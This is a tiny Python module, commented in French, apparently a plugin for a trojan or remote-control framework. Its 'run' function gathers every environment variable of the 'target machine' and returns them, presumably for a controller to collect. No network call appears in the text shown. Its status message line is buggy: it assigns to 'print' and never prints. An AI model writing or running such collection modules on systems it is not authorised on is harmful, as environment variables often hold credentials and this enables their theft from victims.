import os

# Fonction qui permet de recuperer les variables denvironnement de la machine cible

def run(**args) :
    print=("[*] recuperation des variables environnement de la machine cible")
    return str(os.environ)